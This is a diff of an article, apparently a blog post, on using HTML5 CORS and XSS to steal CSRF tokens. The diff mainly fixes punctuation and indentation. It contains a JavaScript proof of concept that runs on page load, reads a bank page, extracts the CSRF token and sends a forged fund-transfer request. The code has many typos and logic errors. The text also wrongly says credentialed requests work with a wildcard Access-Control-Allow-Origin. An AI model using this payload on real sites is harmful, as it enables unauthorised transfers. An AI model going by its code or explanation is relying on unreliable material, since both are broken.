@@ -17,7 +17,7 @@ What does it mean? So long as the Website, let's call it Website A, can exchange
 The fact is that you can takeover a session of any user using XSS vulnerability. This is possible only thanks to the COR support of HTML5 and it allows some tunneled connections. 
 
 
-But my site is secure I am using CSRF tokens …
+But my site is secure, I am using CSRF tokens …
 ----------------------------------------------
 
 HTML5 allows to steal CSRF tokens. For example, if the token goes in the URL, or the GET request, you can safely steal CSRF tokens, and this is consistent with the definition of CORS. An attacker could freely use CSRF token and the user will not even notice. To carry out this attack, attribute "withCredentials" has to be set to true and Access-Control-Allow-Origin to '*'. Let's see how it can be used.
@@ -35,10 +35,11 @@ Suppose that your website has CSRF protection, and the token is sent GET request
       {
         xmlhttp=new XMLHttpRequest();
       }
-    else
-    {
+      else
+      {
       xlmlhttp=new ActiveXObject(“Microsof.XMLHTTP”);
-    }
+      }
+    
     xmlhttp.open(“GET”,”http://localhost/myBank/transfer.hmlt”,false);
     xmlhttp.send();
     if(xmlhttp.status=200)
@@ -47,10 +48,11 @@ Suppose that your website has CSRF protection, and the token is sent GET request
       var n=str.search(“csrfToken”);
       var final=str.substring(n+18,n+28);
       var url = “http://loclhost/myBank/TransferFund.html?datum1%2F=06-06-2013&amp;Account=1234&amo;csrfToken=” + escape(final);
-    xmlhttp.open(“GET”, url, true);
-    xmlhttp.send();
+      xmlhttp.open(“GET”, url, true);
+      xmlhttp.send();
     }
     
+    }
     </script>
     </head>
     <body onload=”exploit();”>
